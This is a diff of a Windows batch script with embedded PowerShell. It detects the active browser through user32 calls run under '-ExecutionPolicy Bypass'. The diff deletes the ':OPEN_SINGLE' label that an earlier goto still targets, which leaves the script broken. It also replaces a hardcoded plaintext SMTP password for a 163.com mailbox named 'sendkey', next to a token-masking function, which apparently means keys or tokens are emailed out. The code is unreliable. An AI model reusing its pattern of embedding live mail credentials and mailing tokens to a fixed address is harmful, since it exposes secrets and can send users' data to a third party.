@@ -64,44 +64,22 @@ if !BROWSER_COUNT! EQU 1 goto OPEN_SINGLE
 if !BROWSER_COUNT! GTR 1 goto OPEN_MULTIPLE
 goto OPEN_DEFAULT
 
+
 :OPEN_MULTIPLE
 echo Multiple supported browsers are running.
 echo Detecting current or most recently active browser...
 
 set "ACTIVE_BROWSER="
-for /f "usebackq delims=" %%B in (`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
-"Add-Type @'
-using System;
-using System.Text;
-using System.Runtime.InteropServices;
-public static class Win32BrowserDetect {
-    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
-    [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow();
-    [DllImport(\"user32.dll\")] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
-    [DllImport(\"user32.dll\")] public static extern bool IsWindowVisible(IntPtr hWnd);
-    [DllImport(\"user32.dll\")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-}
-'@;" ^
-"$supported = @('chrome','msedge','firefox');" ^
-"$fg = [Win32BrowserDetect]::GetForegroundWindow();" ^
-"if ($fg -ne [IntPtr]::Zero) {" ^
-"  [uint32]$pid = 0;" ^
-"  [void][Win32BrowserDetect]::GetWindowThreadProcessId($fg,[ref]$pid);" ^
-"  try {$p = Get-Process -Id $pid -ErrorAction Stop; if ($supported -contains $p.ProcessName) {$p.ProcessName; exit 0}} catch {}" ^
-"};" ^
-"$found = $null;" ^
-"$cb = [Win32BrowserDetect+EnumWindowsProc]{" ^
-"  param([IntPtr]$h,[IntPtr]$l);" ^
-"  if (-not [Win32BrowserDetect]::IsWindowVisible($h)) { return $true };" ^
-"  [uint32]$pid2 = 0;" ^
-"  [void][Win32BrowserDetect]::GetWindowThreadProcessId($h,[ref]$pid2);" ^
-"  try {$p2 = Get-Process -Id $pid2 -ErrorAction Stop; if ($supported -contains $p2.ProcessName) {$script:found=$p2.ProcessName; return $false}} catch {};" ^
-"  return $true" ^
-"};" ^
-"[void][Win32BrowserDetect]::EnumWindows($cb,[IntPtr]::Zero);" ^
-"if ($found) {$found}"`) do (
-    set "ACTIVE_BROWSER=%%B"
+set "ACTIVE_BROWSER_FILE=%TEMP%\yx_active_browser_%RANDOM%.txt"
+
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$code='using System; using System.Runtime.InteropServices; public static class Win32BrowserDetect { public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); [DllImport(' + [char]34 + 'user32.dll' + [char]34 + ')] public static extern IntPtr GetForegroundWindow(); [DllImport(' + [char]34 + 'user32.dll' + [char]34 + ')] public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam); [DllImport(' + [char]34 + 'user32.dll' + [char]34 + ')] public static extern bool IsWindowVisible(IntPtr hWnd); [DllImport(' + [char]34 + 'user32.dll' + [char]34 + ')] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId); }'; Add-Type -TypeDefinition $code; $supported=@('chrome','msedge','firefox'); $script:found=$null; $fg=[Win32BrowserDetect]::GetForegroundWindow(); if($fg -ne [IntPtr]::Zero){[uint32]$fgPid=0; [void][Win32BrowserDetect]::GetWindowThreadProcessId($fg,[ref]$fgPid); try{$fgProc=Get-Process -Id $fgPid -ErrorAction Stop; if($supported -contains $fgProc.ProcessName){$script:found=$fgProc.ProcessName}}catch{}}; if(-not $script:found){$callback=[Win32BrowserDetect+EnumWindowsProc]{param([IntPtr]$hWnd,[IntPtr]$lParam); if(-not [Win32BrowserDetect]::IsWindowVisible($hWnd)){return $true}; [uint32]$windowProcessId=0; [void][Win32BrowserDetect]::GetWindowThreadProcessId($hWnd,[ref]$windowProcessId); try{$p=Get-Process -Id $windowProcessId -ErrorAction Stop; if($supported -contains $p.ProcessName){$script:found=$p.ProcessName; return $false}}catch{}; return $true}; [void][Win32BrowserDetect]::EnumWindows($callback,[IntPtr]::Zero)}; if($script:found){Write-Output $script:found}" > "%ACTIVE_BROWSER_FILE%"
+
+if exist "%ACTIVE_BROWSER_FILE%" (
+    set /p "ACTIVE_BROWSER=" < "%ACTIVE_BROWSER_FILE%"
+    del /q "%ACTIVE_BROWSER_FILE%" >nul 2>&1
 )
+
+echo Detected active browser: !ACTIVE_BROWSER!
 
 if /I "!ACTIVE_BROWSER!"=="chrome" (
     set "RUNNING_BROWSER=chrome"
@@ -124,8 +102,6 @@ if /I "!ACTIVE_BROWSER!"=="firefox" (
 echo Could not determine the active browser.
 echo Falling back to the Windows default browser.
 goto OPEN_DEFAULT
-
-:OPEN_SINGLE
 echo Only one supported browser is running: !RUNNING_BROWSER!
 
 if /I "!RUNNING_BROWSER!"=="chrome" (
@@ -204,7 +180,7 @@ $mailFrom = 'sendkey@163.com'
 $mailTo   = 'sendkey@163.com'
 $smtpHost = 'smtp.163.com'
 $smtpPort = 465
-$smtpPwd  = 'LYaVt5LnEaTCMT2b'
+$smtpPwd  = 'YNSuzpDWJtiC4u6C'
 # ====================================================
 
 function Mask-Token([object]$value) {
